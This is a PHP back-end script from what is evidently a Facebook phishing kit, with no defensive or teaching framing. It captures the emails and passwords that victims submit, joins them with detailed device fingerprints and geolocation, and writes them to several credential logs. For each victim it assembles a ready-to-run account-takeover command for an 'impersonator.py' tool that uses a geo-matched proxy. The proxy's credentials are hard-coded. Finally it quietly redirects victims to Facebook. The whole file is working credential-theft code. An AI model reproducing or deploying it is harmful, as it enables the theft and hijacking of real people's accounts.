<?php
// login.php - v3.0 - Unified Credential Appender

// --- INITIALIZATION ---
error_reporting(0);
ini_set('log_errors', 1);
ini_set('error_log', 'php_errors.log');
date_default_timezone_set("Asia/Manila");

$log_file = 'sessions.json';

// --- DATA CAPTURE ---
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$sessionId = $_POST['sessionId'] ?? '';

// --- SESSIONID VALIDATION CHECKPOINT ---
if (empty($sessionId) || $sessionId === 'NO_SESSION_ID') {
    error_log("[ERROR] login.php received empty sessionId for user: $email");
    http_response_code(400);
    echo "Error: Session validation failed.";
    exit();
}

// --- VALIDATION ---
if (empty($email) || empty($password)) {
    http_response_code(400);
    echo "Error: Missing required fields.";
    exit();
}

// --- DATA STRUCTURE ---
$credential_entry = [
    'timestamp' => date('Y-m-d H:i:s'),
    'username' => $email,
    'password' => $password
];

// --- ATOMIC UPDATE OF UNIFIED LOG ---
$handle = fopen($log_file, 'r+');
if (flock($handle, LOCK_EX)) {
    $contents = fread($handle, filesize($log_file) ?: 1);
    // The file is a full JSON array, so decode it directly
    $data = json_decode($contents, true);
    
    $session_found = false;
    if (is_array($data)) {
        foreach ($data as $key => $session) {
            if (isset($session['sessionId']) && $session['sessionId'] === $sessionId) {
                // Append the new credentials to the 'credentials' array
                $data[$key]['credentials'][] = $credential_entry;
                $session_found = true;
                break;
            }
        }
    }

    if ($session_found) {
        // Write the entire modified data structure back to the file
        ftruncate($handle, 0);
        rewind($handle);
        fwrite($handle, json_encode($data, JSON_PRETTY_PRINT));
    }
    
    flock($handle, LOCK_UN);
}
fclose($handle);

// --- ADDITIONAL FORWARDING TO LEGACY FILES ---
// Forward credentials to /home/kali/.site/ files for compatibility

// Get fingerprint data from sessions.json
$fingerprint_data = null;
$location_data = null;
$threat_data = null;
$ip_address = null;

if (file_exists($log_file)) {
    $sessions_content = file_get_contents($log_file);
    if (!empty($sessions_content)) {
        $sessions_data = json_decode($sessions_content, true);
        if (is_array($sessions_data)) {
            foreach ($sessions_data as $session) {
                if (isset($session['sessionId']) && $session['sessionId'] === $sessionId) {
                    $fingerprint_data = $session['fingerprint'] ?? [];
                    $location_data = $session['location'] ?? [];
                    $threat_data = $session['threat'] ?? [];
                    $ip_address = $session['ip_address'] ?? 'Unknown';
                    break;
                }
            }
        }
    }
}

// Format fingerprint data for text files
$fingerprint_text = "";
if ($fingerprint_data) {
    $fingerprint_text = "\n--- DEVICE FINGERPRINT ---\n";
    $fingerprint_text .= "User Agent: " . ($fingerprint_data['userAgent'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Platform: " . ($fingerprint_data['platform'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Language: " . ($fingerprint_data['language'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Hardware Concurrency: " . ($fingerprint_data['hardwareConcurrency'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Device Memory: " . ($fingerprint_data['deviceMemory'] ?? 'N/A') . "GB\n";
    $fingerprint_text .= "Screen Resolution: " . ($fingerprint_data['screenResolution'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Color Depth: " . ($fingerprint_data['colorDepth'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Timezone: " . ($fingerprint_data['timezone'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Touch Support: " . ($fingerprint_data['touchSupport'] ?? 'N/A') . "\n";
    $fingerprint_text .= "WebGL Vendor: " . ($fingerprint_data['webGLVendor'] ?? 'N/A') . "\n";
    $fingerprint_text .= "WebGL Renderer: " . ($fingerprint_data['webGLRenderer'] ?? 'N/A') . "\n";
    $fingerprint_text .= "WebGL Unmasked Vendor: " . ($fingerprint_data['webGLUnmaskedVendor'] ?? 'N/A') . "\n";
    $fingerprint_text .= "WebGL Unmasked Renderer: " . ($fingerprint_data['webGLUnmaskedRenderer'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Canvas Fingerprint: " . ($fingerprint_data['canvasFingerprint'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Audio Fingerprint: " . ($fingerprint_data['audioFingerprint'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Fonts: " . (isset($fingerprint_data['fonts']) ? implode(', ', $fingerprint_data['fonts']) : 'N/A') . "\n";
    $fingerprint_text .= "Local Storage: " . ($fingerprint_data['localStorage'] ? 'Yes' : 'No') . "\n";
    $fingerprint_text .= "Session Storage: " . ($fingerprint_data['sessionStorage'] ? 'Yes' : 'No') . "\n";
    $fingerprint_text .= "IndexedDB: " . ($fingerprint_data['indexedDB'] ? 'Yes' : 'No') . "\n";
    $fingerprint_text .= "Cookie Enabled: " . ($fingerprint_data['cookieEnabled'] ? 'Yes' : 'No') . "\n";
    
    // NEW: Enhanced fingerprint parameters
    $fingerprint_text .= "Battery Level: " . ($fingerprint_data['batteryLevel'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Battery Charging: " . ($fingerprint_data['batteryCharging'] ? 'Yes' : 'No') . "\n";
    $fingerprint_text .= "Connection Type: " . ($fingerprint_data['connectionType'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Connection Downlink: " . ($fingerprint_data['connectionDownlink'] ?? 'N/A') . " Mbps\n";
    $fingerprint_text .= "Screen Avail Width: " . ($fingerprint_data['screenAvailWidth'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Screen Avail Height: " . ($fingerprint_data['screenAvailHeight'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Pixel Depth: " . ($fingerprint_data['pixelDepth'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Do Not Track: " . ($fingerprint_data['doNotTrack'] ?? 'N/A') . "\n";
    $fingerprint_text .= "Plugin Count: " . ($fingerprint_data['pluginCount'] ?? 'N/A') . "\n";
}

// Format location data
$location_text = "";
if ($location_data) {
    $location_text = "\n--- LOCATION DATA ---\n";
    $location_text .= "IP Address: " . $ip_address . "\n";
    $location_text .= "Country: " . ($location_data['country'] ?? 'N/A') . "\n";
    $location_text .= "Region: " . ($location_data['region'] ?? 'N/A') . "\n";
    $location_text .= "City: " . ($location_data['city'] ?? 'N/A') . "\n";
    $location_text .= "ZIP: " . ($location_data['zip'] ?? 'N/A') . "\n";
    $location_text .= "ASN: " . ($location_data['asn'] ?? 'N/A') . "\n";
    $location_text .= "ISP: " . ($location_data['isp'] ?? 'N/A') . "\n";
}

// Format threat data
$threat_text = "";
if ($threat_data) {
    $threat_text = "\n--- THREAT ASSESSMENT ---\n";
    $threat_text .= "Level: " . ($threat_data['level'] ?? 'N/A') . "\n";
    $threat_text .= "Reason: " . ($threat_data['reason'] ?? 'N/A') . "\n";
}

// 1. Forward to usernames.txt (SIMPLIFIED FORMAT - in ~/.site/ for maxphisher2.py compatibility)
$usernames_file = '/home/haymayndz/.site/usernames.txt';
// Simplified format: timestamp, email, password, IP, country, region, city, zipcode, ISP, ASN, Coordinates, User Agent
$user_agent = $fingerprint_data['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$coordinates = '';
if ($location_data && isset($location_data['lat']) && isset($location_data['lon'])) {
    $coordinates = $location_data['lat'] . ',' . $location_data['lon'];
} else {
    $coordinates = 'N/A';
}
$usernames_entry = "Timestamp: " . date('Y-m-d H:i:s') . "\n";
$usernames_entry .= "Email: " . $email . "\n";
$usernames_entry .= "Password: " . $password . "\n";
$usernames_entry .= "IP Address: " . $ip_address . "\n";
$usernames_entry .= "Country: " . ($location_data['country'] ?? 'N/A') . "\n";
$usernames_entry .= "Region: " . ($location_data['region'] ?? 'N/A') . "\n";
$usernames_entry .= "City: " . ($location_data['city'] ?? 'N/A') . "\n";
$usernames_entry .= "ZIP Code: " . ($location_data['zip'] ?? 'N/A') . "\n";
$usernames_entry .= "ISP: " . ($location_data['isp'] ?? 'N/A') . "\n";
$usernames_entry .= "ASN: " . ($location_data['asn'] ?? 'N/A') . "\n";
$usernames_entry .= "Coordinates: " . $coordinates . "\n";
$usernames_entry .= "User Agent: " . $user_agent . "\n";
$usernames_entry .= "====================\n\n";
file_put_contents($usernames_file, $usernames_entry, FILE_APPEND | LOCK_EX);

// 2. Forward to creds.txt (in PROJECT DIRECTORY with command block)
$creds_file = '/home/haymayndz/maxphisher2-clean/creds.txt';

// Build the geo-targeted proxy string
$proxy_parts = [];
if ($location_data) {
    if (!empty($location_data['country'])) {
        $proxy_parts[] = "cr." . strtolower($location_data['country']);
    }
    if (!empty($location_data['region'])) {
        $region_clean = preg_replace('/[^a-zA-Z0-9]/', '', strtolower($location_data['region']));
        $proxy_parts[] = "state." . $region_clean;
    }
    if (!empty($location_data['city'])) {
        $city_clean = preg_replace('/[^a-zA-Z0-9]/', '', strtolower($location_data['city']));
        $proxy_parts[] = "city." . $city_clean;
    }
    if (!empty($location_data['zip'])) {
        $proxy_parts[] = "zip." . $location_data['zip'];
    }
    if (!empty($location_data['asn'])) {
        $proxy_parts[] = "asn." . $location_data['asn'];
    }
}

// Construct full proxy string
$proxy_base_user = "ae9bd5562646a8d33a7e";
$proxy_api_key = "5faeb42127544013";
$proxy_gateway = "gw.dataimpulse.com:823";

if (!empty($proxy_parts)) {
    $location_string = implode(";", $proxy_parts);
    $proxy_string = "socks5://{$proxy_base_user}__{$location_string}:{$proxy_api_key}@{$proxy_gateway}";
} else {
    $proxy_string = "socks5://{$proxy_base_user}:{$proxy_api_key}@{$proxy_gateway}";
}

// Build profile path
$profile_path = "/tmp/victim_profiles/{$sessionId}_profile.json";

// Build ready-to-run command
$command_block = "\n--- READY-TO-RUN COMMAND ---\n";
$command_block .= "# Profile: {$profile_path}\n";
$command_block .= "# Proxy: {$proxy_string}\n";
$command_block .= "\n";
$command_block .= "python3 ~/haymayndz/impersonator.py \\\n";
$command_block .= "  --profile \"{$profile_path}\" \\\n";
$command_block .= "  --username \"{$email}\" \\\n";
$command_block .= "  --password \"{$password}\" \\\n";
$command_block .= "  --proxy \"{$proxy_string}\"\n";
$command_block .= "\n# Or with proxy validation:\n";
$command_block .= "python3 ~/haymayndz/validate_and_run.py \\\n";
$command_block .= "  --session-id \"{$sessionId}\" \\\n";
$command_block .= "  --username \"{$email}\" \\\n";
$command_block .= "  --password \"{$password}\"\n";
$command_block .= "----------------------------\n\n";

$creds_entry = "Timestamp: " . date('Y-m-d H:i:s') . "\nSession ID: {$sessionId}\nFacebook Email: {$email}\nPassword: {$password}" . $location_text . $fingerprint_text . $threat_text . $command_block . "====================\n\n";
file_put_contents($creds_file, $creds_entry, FILE_APPEND | LOCK_EX);

// 3. Forward to creds.json (JSON format with complete fingerprint)
$creds_json_file = '/home/haymayndz/maxphisher2-clean/creds.json';
$json_entry = [
    'Session ID' => $sessionId,
    'Facebook Email' => $email,
    'Password' => $password,
    'Timestamp' => date('Y-m-d H:i:s'),
    'IP Address' => $ip_address,
    'Location' => $location_data,
    'Fingerprint' => $fingerprint_data,
    'Threat Assessment' => $threat_data
];

// Read existing JSON data
$existing_data = [];
if (file_exists($creds_json_file)) {
    $existing_content = file_get_contents($creds_json_file);
    if (!empty($existing_content)) {
        $existing_data = json_decode($existing_content, true) ?: [];
    }
}

// Add new entry
$existing_data[] = $json_entry;

// Write back to file
file_put_contents($creds_json_file, json_encode($existing_data, JSON_PRETTY_PRINT), LOCK_EX);

// --- RESPOND TO CLIENT ---
// After successful logging, send the redirect URL.
header('Content-Type: text/plain');
echo "https://www.facebook.com/"; // The redirect URL
exit();
?>